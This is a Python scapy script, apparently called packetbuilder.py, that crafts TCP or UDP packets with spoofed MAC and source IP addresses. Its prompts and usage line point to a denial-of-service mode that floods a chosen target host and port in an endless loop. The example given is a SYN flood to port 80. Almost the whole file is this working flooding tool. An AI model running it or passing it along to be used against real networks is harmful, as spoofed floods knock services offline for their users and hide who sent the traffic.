from scapy.all import *
import random
import time


###################################################################################################
# Usage:                                                                                          #
# python3.6 packetbuilder.py [MACSPOOF] [SRCIP] [DSTIP] [PROT] [DSTPORT] [FLAG] [Message] [DOS]    #
#                                                                                                 #
# Example:                                                                                        #
# python3.6 packetbuilder.py YES 5.5.5.5 192.168.188.1 TCP 80 S "Test:)" YES                      #
#                                                                                                 #
###################################################################################################
#Define your interface
interface="en0"
s = conf.L3socket(iface=interface)

macspoof,ipspoof, srcip, dstip, prot, port, flag, msg, dos, slow = "","","","","","","","","",""

#Define parameter
if len(sys.argv) > 1 :
    macspoof = sys.argv[1]
    srcip = sys.argv[2]
    dstip = sys.argv[3]
    prot = sys.argv[4]
    port = int(sys.argv[5])
    flag = sys.argv[6]
    msg = sys.argv[7]
    dos = sys.argv[8]

def macspoofer():
    x1=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x2=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x3=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x4=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x5=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x6=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    mac=[x1, x2, x3, x4, x5, x6]
    mac=mac[0]+":"+mac[1]+":"+mac[2]+":"+mac[3]+":"+mac[4]+":"+mac[5]
    return mac

def ipspoofer():
    ip1=str(random.randrange(1,254))
    ip2=str(random.randrange(1,254))
    ip3=str(random.randrange(1,254))
    ip4=str(random.randrange(1,254))
    ipaddr=[ip1, ip2, ip3, ip4]
    ipaddr=ipaddr[0]+"."+ipaddr[1]+"."+ipaddr[2]+"."+ipaddr[3]
    return ipaddr


if macspoof == "":
    print ("Enable Mac Spoofer? - [YES] or [NO]:")
    macspoof=str(input())
    macspoof=macspoof.upper()

if macspoof == "YES":
    mac=macspoofer()
    print("Using SRC-MAC-Address: "+mac)
    etherframe=Ether(src=mac)

if ipspoof == "" and srcip== "":
    print ("Enable IP-SRC Spoofer? - [YES] or [NO]:")
    ipspoof=str(input())
    ipspoof=ipspoof.upper()

if ipspoof == "YES" or srcip=="YES":
    srcip=ipspoofer()
    print("Using SRC-IP-Address: "+srcip)

if srcip == "":
    print("SRC_IP: ")
    srcip= str(input())

if dstip == "":
    print("DST_IP: ")
    dstip= str(input())

if prot == "":
    print("Choose [TCP] or [UDP]: ")
    prot=str(input())
    prot=prot.upper()

if port == "":
    print("Choose DST-Port: ")
    port=int(input())

if (prot == "" or flag == "") and prot != "UDP":
        print("Choose Flag: [S],[SA],[A] ")
        flag=str(input())
        flag=flag.upper()

if msg == "":
    print ("Enter message for sending..:")
    msg=str(input())

length=len(msg)
length2=int(1460/length)
data=Raw(load=msg*length2)

if dos == "":
    print ("DoS? - [YES] or [NO] :-)  : ")
    dos=str(input())
    dos=dos.upper()

if slow == "" and dos != "YES":
    print ("Slow sending?: [YES] or [NO] : ")
    slow=str(input())
    slow=slow.upper()

# Build IP-Header
iphdr=IP(src=srcip,dst=dstip)

# Random Source port

srcport=random.randrange(1025,65535)

# Build TCP packet
if prot == "TCP":
    tcp=TCP(sport=srcport,dport=port,flags=flag)
    if macspoof == "YES":
        packet=etherframe/iphdr/tcp/data
    else:
        packet=iphdr/tcp/data

# Build UDP packet
if prot == "UDP":
    udp=UDP(sport=srcport,dport=port)
    if macspoof == "YES":
        packet=etherframe/iphdr/udp/data
    else:
        packet=iphdr/udp/data

# Send the packet

if macspoof == "YES":
    sendp(packet, iface=interface)
else:
    send(packet)

# DOS sending...
if dos =="YES":
    while True:
        if macspoof == "YES":
            mac=macspoofer()
            etherframe=Ether(src=mac)
            if ipspoof == "YES":
                iphdr=IP(src=ipspoofer(),dst=dstip)
            elif prot == "TCP":
                srcport=random.randrange(1025,65535)
                tcp=TCP(sport=srcport,dport=port,flags=flag)
                packet=etherframe/iphdr/tcp/data
                sendp(packet, iface=interface)
            elif prot == "UDP":
                srcport=random.randrange(1025,65535)
                udp=UDP(sport=srcport,dport=port)
                packet=etherframe/iphdr/udp/data
                sendp(packet, iface=interface)
        elif macspoof == "NO":
            if ipspoof == "YES":
                iphdr=IP(src=ipspoofer(),dst=dstip)
            elif prot == "TCP":
                srcport=random.randrange(1025,65535)
                tcp=TCP(sport=srcport,dport=port,flags=flag)
                packet=iphdr/tcp/data
                send(packet)
            elif prot == "UDP":
                srcport=random.randrange(1025,65535)
                udp=UDP(sport=srcport,dport=port)
                packet=iphdr/udp/data
                send(packet)
if slow == "YES":
    while True:
        if ipspoof == "YES":
            iphdr=IP(src=ipspoofer(),dst=dstip)
        elif prot=="TCP":
            srcport=random.randrange(1025,65535)
            tcp=TCP(sport=srcport,dport=port,flags=flag)
            packet=iphdr/tcp/data
        elif prot =="UDP":
            srcport=random.randrange(1025,65535)
            udp=UDP(sport=srcport,dport=port)
            packet=iphdr/udp/data

        s.send(packet)
        time.sleep(1)


s.send(packet)
#send(packet)
